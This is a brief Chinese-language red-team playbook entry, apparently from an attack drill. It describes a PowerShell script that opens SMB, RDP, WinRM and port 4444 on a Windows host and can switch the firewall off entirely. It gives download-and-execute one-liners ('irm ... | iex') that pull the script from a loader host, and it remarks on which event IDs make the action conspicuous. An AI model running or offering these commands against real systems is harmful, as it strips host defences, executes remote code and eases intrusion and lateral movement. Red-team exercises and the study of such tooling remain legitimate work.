# 防火墙

`firewall_open.ps1`：放行 445/139/137/138/135/3389/5985/5986/4450/4444 + ICMP；`-DisableFirewallAll` 全局关闭；`-Revert` 移除。

```powershell
irm http://LOADER_IP:8090/firewall/firewall_open.ps1 | iex
irm http://LOADER_IP:8090/firewall/firewall_open.ps1 | iex -DisableFirewallAll
```

⚠️ 全局关闭防火墙是最刺眼的动作（4946/4947 事件），演练收尾必恢复。
